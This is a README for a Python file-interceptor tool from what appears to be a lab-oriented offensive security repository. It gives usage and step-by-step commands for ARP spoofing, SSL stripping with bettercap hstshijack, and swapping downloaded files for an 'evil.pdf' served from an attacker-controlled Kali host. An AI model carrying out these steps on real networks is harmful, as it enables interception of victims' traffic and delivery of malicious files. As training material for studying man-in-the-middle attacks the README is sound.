# File interceptor

## Requirements

* Root access
* Python 3
* Scapy and NetfilterQueue modules

## Usage

```shell
usage: file_interceptor.py [-h] [-e EXTENSION] [-d DESTINATION] [-u URL]

File replacement tool (use Bettercap hstshijack/hstshijack for sslstripping)

optional arguments:
  -h, --help            show this help message and exit
  -e EXTENSION, --extension EXTENSION
                        File extension
  -d DESTINATION, --destination DESTINATION
                        sslstrip, forward, or local
  -u URL, --url URL     Replacement url

Example: 
            file_interceptor.py # replace a .pdf with an evil.pdf file in location apache2 server on kali, sslstrip
            file_interceptor.py -e .pdf -u 192.168.122.108/evil/evil.pdf            # replace a .pdf file
            file_interceptor.py -e .pdf -u 192.168.122.108/evil/evil.pdf -d local   # test replacing a .pdf file
                                                                                                                      
```

## Kicking the tyres

* Choose what type of file to replace, and make sure you have a replacement file in `/var/www/html/evil/`
* Run the [arp_spoofer.py script](/layer2/arp_spoofer)

```shell
    @kali:~$ sudo python3 arp_spoofer.py
    [sudo] password for <user>: 
    [+] Setting forward
    [+] Packets sent: 63
```
* Run `bettercap` (also see the Troubleshooting section below)

```shell
    @kali:~$ sudo bettercap -iface eth0 -caplet hstshijack/hstshijack
```
* Run the `file_interceptor.py` script. Defaults are set to replace a .pdf with an evil.pdf file in the `/var/www/html/evil/` location of the Kali `apache2` server on the Kali VM, and using `sslstrip`.

```shell
    @kali:~$ sudo python3 file_interceptor.py 
```
And test file is replaced on Windows machine. Clear cache and history of browser first!

## Troubleshooting

* [ImportError on NetfilterQueue](https://github.com/tymyrddin/ymrir/wiki/netfilterqueue.md)
* [ImportError on Scapy](https://github.com/tymyrddin/ymrir/wiki/scapy.md)
* [Bettercap sslstrip not working](https://github.com/tymyrddin/ymrir/wiki/bettercap.md)
* [Undesired HTTPS redirects](https://github.com/tymyrddin/ymrir/wiki/https-browser.md)
* [Correctly configured HSTS](https://github.com/tymyrddin/ymrir/wiki/hsts.md)